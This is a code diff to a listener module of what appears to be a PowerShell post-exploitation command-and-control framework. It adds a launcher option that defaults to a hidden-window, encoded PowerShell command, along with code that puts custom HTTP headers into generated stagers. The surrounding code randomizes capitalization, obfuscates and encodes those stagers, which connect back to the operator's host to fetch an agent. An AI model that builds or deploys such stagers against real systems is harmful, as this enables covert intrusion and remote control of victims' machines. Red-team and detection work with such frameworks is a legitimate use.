@@ -45,6 +45,11 @@ class Listener:
                 'Required'      :   True,
                 'Value'         :   80
             },
+            'Launcher' : {
+                'Description'   :   'Launcher string.',
+                'Required'      :   True,
+                'Value'         :   'powershell -noP -w 1 -enc '
+            },
             'StagingKey' : {
                 'Description'   :   'Staging key for initial agent negotiation.',
                 'Required'      :   True,
@@ -130,11 +135,13 @@ class Listener:
             # extract the set options for this instantiated listener
             listenerOptions = self.mainMenu.listeners.activeListeners[listenerName]['options']
             host = listenerOptions['Host']['Value']
+            launcher = listenerOptions['Launcher']['Value']
             stagingKey = listenerOptions['StagingKey']['Value']
             profile = listenerOptions['DefaultProfile']['Value']
             uris = [a for a in profile.split('|')[0].split(',')]
             stage0 = random.choice(uris)
-
+            customHeaders = profile.split('|')[2:]
+            
             if language.startswith('po'):
                 # PowerShell
 
@@ -181,6 +188,14 @@ class Listener:
 
                 # TODO: reimplement stager retries?
 
+                #Add custom headers if any
+                if customHeaders != []:
+                    for header in customHeaders:
+                        headerKey = header.split(':')[0]
+                        headerValue = header.split(':')[1]
+                        stager += helpers.randomize_capitalization("$wc.Headers.Add(")
+                        stager += "\"%s\",\"%s\");" % (headerKey, headerValue)
+                        
                 # code to turn the key string into a byte array
                 stager += helpers.randomize_capitalization("$K=[System.Text.Encoding]::ASCII.GetBytes(")
                 stager += "'%s');" % (stagingKey)
@@ -207,7 +222,7 @@ class Listener:
                     stager = helpers.obfuscate(stager, self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
                 # base64 encode the stager and return it
                 if encode and ((not obfuscate) or ("launcher" not in obfuscationCommand.lower())):
-                    return helpers.powershell_launcher(stager)
+                    return helpers.powershell_launcher(stager, launcher)
                 else:
                     # otherwise return the case-randomized stager
                     return stager
